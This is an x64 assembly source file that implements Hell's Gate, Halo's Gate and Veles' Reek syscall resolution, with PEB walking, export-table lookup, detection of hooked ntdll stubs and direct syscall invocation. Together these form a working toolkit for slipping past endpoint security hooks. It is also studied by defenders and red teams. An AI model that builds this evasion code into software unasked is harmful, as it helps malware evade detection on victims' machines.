
comment $
	Author	=> Abdallah Mohamed
	Date	=> 4-3-2023/09:29PM
$


.data

; will store the syscall number to use with HellDescent procedure
wSysCallNumber DW ?


.code

; Get Process Environment Block
GetPEB proc
	; Read G Segment register which contains PEB and also TEB 
	mov rax, qword ptr gs:[60h]
	ret
GetPEB endp

; Get length of unicode string
; Input  = RDI -> Address of the string
; Output = RCX 
GetStrLenW proc
	push rax
	push rdi        ; save string pointer
	mov rcx, -1     ; biggest number possible
	xor ax, ax      ; NUL-Terminator
	repne scasw     ; repeat until reach NUL
	not rcx         ; convert to a positive number
	dec rcx         ; we started from -1
	pop rdi         ; restore string pointer
	pop rax
	ret
GetStrLenW endp

; Get length of ansi string
; Input  = RDI -> Address of the string
; Output = RCX 
GetStrLenA proc
	push rax
	push rdi        ; save string pointer
	mov rcx, -1     ; biggest number possible
	xor al, al      ; NUL-Terminator
	repne scasb     ; repeat until reach NUL
	not rcx         ; convert to a positive number
	dec rcx         ; we started from -1
	pop rdi         ; restore string pointer
	pop rax
	ret
GetStrLenA endp

; Used in GetModuleHandle2 and GetProcAddress2
RequiredDataNotFound proc
	xor rax, rax          ; Return NULL if we didn't find the required data
	ret
RequiredDataNotFound endp

; Get Module Base Address 
GetModuleHandleW2 proc
	mov rdi, rcx              ; Module name
	call GetStrLenW           ; Get module name length
	call GetPEB               ; Get Process Environment Block 
	mov rax, [rax + 18h]      ; pPEB->pLdr
	lea rax, [rax + 20h]      ; &pLdr->InMemoryOrderModuleList
	                          ; We point to the first node in the list
	mov rbx, rax              ; Save first node address 
	
	NEXT_MODULE:
	cld                       ; Clear Direction Flag
	mov rax, [rax]            ; Move to the next node in the list 
	cmp rax, rbx              ; Check if we reach last node, first == last
	jz RequiredDataNotFound
	mov rsi, [rax + 50h]      ; Get unicode module name
	push rsi                  ; Save current module name
	push rdi                  ; Save required module name
	push rcx                  ; Save the length of module name in the stack
	repe cmpsw                ; Compare current dll name with required dll
	pop rcx                   ; Restore the length of the module name from the stack
	pop rdi                   ; Restore required module name
	pop rsi                   ; Restore current module name
	jz FOUND                  ; Jump if we found the required dll 
	jmp NEXT_MODULE

	FOUND:
	mov rax, [rax + 20h]      ; Get dll base address
	ret
GetModuleHandleW2 endp

; Get Procedure Address from a dll
GetProcAddress2 proc
	mov rdi, rdx                     ; Procedure name
	mov rdx, rcx                     ; Dll Base Address
	call GetStrLenA                  ; Get Length of required function name
	mov eax, dword ptr [rdx + 3Ch]   ; NT Headers RVA
	add rax, rdx                     ; DllBaseAddress + DOS->e_lfanew
	mov eax, dword ptr [rax + 88h]   ; Export Table RVA
	                                 ; IMAGE_NT_HEADERS->IMAGE_OPTIONAL_HEADER->IMAGE_DATA_DIRECTORY->VirtualAddress
	test rax, rax                    ; Check if no exports address
	jz RequiredDataNotFound

	add rax, rdx                     ; DllBaseAddress + ExportVirtualAddress
	push rcx                         ; Save procedure name length in the stack
	mov cx, word ptr [rax + 18h]     ; NumberOfNames
	mov r8d, dword ptr [rax + 20h]   ; AddressOfNames RVA
	add r8, rdx                      ; Add base address

	NEXT_FUNCTION:
	mov esi, [r8 + rcx * 4h]         ; Get procedure name RVA
	add rsi, rdx                     ; Add base address
	pop rbx                          ; Restore procedure name length from the stack
	xchg rbx, rcx                    ; Toggling between prcedure name and number of functions
	push rsi                         ; Save current function name
	push rdi                         ; Save required function name
	push rcx                         ; Save required function name length
	repe cmpsb                       ; Compare function name with required function
	pop rcx                          ; Restore the length of the function name
	pop rdi                          ; Restore required function name
	pop rsi                          ; Restore current function name
	jz FOUND                         ; Jump if we found the required function 
	xchg rbx, rcx                    ; Back function length and number of function names again
	push rbx                         ; Save function name length in the stack
	loop NEXT_FUNCTION

	; Required function doesn't exist in this dll
	pop rbx
	jmp RequiredDataNotFound

	FOUND:
	; Check if the length of the found function equal required function length
	xchg rsi, rdi                    ; Toggling between current function name and required function name
	                                 ; because GetStrLenA takes rdi as a parameter
	xchg rbx, rcx                    ; Toggling between prcedure name and number of functions
	push rbx                         ; Save required function name length
	push rcx                         ; Save number of function names
	call GetStrLenA                  ; Get length of current function name
	cmp rcx, rbx                     ; CurrentFunctionLength == RequiredFunctionLength ?
	pop rcx                          ; Restore number of function names
	xchg rsi, rdi                    ; back them again
	jnz NEXT_FUNCTION2               ; If length of both not same we should dig deeper
	                                 ; Maybe we were comparing some thing like VirtualAlloc and VirtualAllocEx
	                                 ; We had better avoid this cases

	pop rbx
	mov r9d, dword ptr [rax + 24h]   ; AddressOfNameOrdinals RVA
	add r9, rdx                      ; Add base address
	mov cx, word ptr [r9 + 2h * rcx] ; Get required function ordinal
	mov r8d, dword ptr [rax + 1Ch]   ; AddressOfFunctions RVA
	add r8, rdx                      ; Add base address
	mov eax, [r8 + 4h * rcx]         ; Get required function address RVA
	add rax, rdx                     ; Add base address

	ret

	NEXT_FUNCTION2:
	dec rcx                          ; Decrease loop counter 
	jmp NEXT_FUNCTION                ; Dig deeper

GetProcAddress2 endp

; For return 0 if the syscall was hooked
HookedSyscall proc
	; return 0
	mov rax, 0
	ret
HookedSyscall endp

; Grab syscall number dynamically
HellsGateGrabber proc
	comment $
		every syscall starts with the following instrucions
			; mov r10, rcx
			; mov eax, <SyscallNumber> <-- We need to resolve this number
	$

	; syscall pattern
	mov esi, 0b8d18b4ch

	; move the syscall content into edi 
	mov edi, [rcx]

	; Check if hooked or not
	cmp esi, edi

	; return 0 if hooked
	jne HookedSyscall

	; Clear accumlator 
	xor rax, rax

	; Grab the syscall number
	mov ax, [rcx + 4]

	; the end of the procedure
	ret
HellsGateGrabber endp

; Prepare the syscall
HellsGate proc
	; Read syscall number as a parameter and store it in the memory
	mov wSysCallNumber, cx
	ret
HellsGate endp

; Call the specified syscall
HellDescent proc
	; Move args into r10 register which used by the syscall
	mov r10, rcx

	; Specify the syscall number
	mov eax, dword ptr wSysCallNumber

	syscall
	ret
HellDescent endp

; Try to resolve syscall from neighbors
HaloGateDown proc
	; syscall size
	mov rax, 20h

	; Clear rbx register
	xor rbx, rbx

	; Save dx in bx to use it later, because mul instruction will destroy dx
	mov bx, dx

	; multiply size of syscall by the index of neighbors
	mul dx

	; go down
	add rcx, rax

	; move the neighbor syscall content into edi 
	mov edi, [rcx]

	comment $
		every syscall starts with the following instructions
			; mov r10, rcx
			; mov eax,

		the b8d18b4ch value is the machine code of these instruction,
		let's move it to esi register to compare it with the neighbor syscall
	$
	mov esi, 0b8d18b4ch

	comment $
		Check if the neighbor syscall starts with
			; mov r10, rcx
			; mov eax,
	$
	cmp esi, edi

	; if hooked return 0
	jne HookedSyscall

	xor rax, rax

	; return the syscall number
	mov ax, [rcx + 4]
	sub ax, bx
	ret
HaloGateDown endp

; Try to resolve syscall from neighbors
HaloGateUp proc
	; syscall size
	mov rax, 20h

	; Clear rbx register
	xor rbx, rbx

	; Save dx in bx to use it later, because mul instruction will destroy dx
	mov bx, dx

	; multiply size of syscall by the index of neighbors
	mul dx

	; go up
	sub rcx, rax

	; move the neighbor syscall content into edi 
	mov edi, [rcx]

	comment $
		every syscall starts with the following instructions
			; mov r10, rcx
			; mov eax,

		the b8d18b4ch value is the machine code of these instruction,
		let's move it to esi register to compare it with the neighbor syscall
	$
	mov esi, 0b8d18b4ch

	comment $
		Check if the neighbor syscall starts with
			; mov r10, rcx
			; mov eax,
	$
	cmp esi, edi

	; if hooked return 0
	jne HookedSyscall

	xor rax, rax

	; return the syscall number
	mov ax, [rcx + 4]
	add ax, bx
	ret
HaloGateUp endp

; Used in VelesReek
FixSyscallNumber proc
	inc rax
	ret
FixSyscallNumber endp

; Calculate syscall number from its position between others syscalls
VelesReek proc
	; Clear registers
	xor rax, rax
	xor rbx, rbx
	
	; pattern of -> 'syscall ; ret ; int'
	mov edi, 0cdc3050fh

	DIG:
	; Move instructions into esi to campare with the pattern
	mov esi, [rdx]

	; Move to the next address
	inc rdx

	; Compare pattern with current instructions
	cmp esi, edi
	
	; Find syscall address
	je FINDSYSCALLADDR

	; Dig deeper
	loop DIG
	
	FINDSYSCALLADDR:
	; We have found a syscall
	inc rbx

	; Find syscall address
	mov rax, rdx    ; pattern address
	dec rax         ; decrease address by one because the instructions above have increased it			
	sub rax, 12h    ; pattern - 0x12 = syscall address

	; Check if it's the target stub or not, to continue in digging
	cmp rax, r8
	
	; If it's not the target syscall, dig deeper
	jne DIG

	; Syscall numbers starts from 0
	dec rbx

	; For return syscall number
	mov rax, rbx

	; NtQuerySystemTime syscall number
	mov cx, 05ah

	; check if the syscall number we found after NtQuerySystemTime or not
	cmp bx, cx

	; If the syscall number we found is greater than NtQuerySystemTime number, we must increase it with one
	; because we missed this syscall, because it doesn't have the pattern we use.
	jge FixSyscallNumber

	ret
VelesReek endp
	
end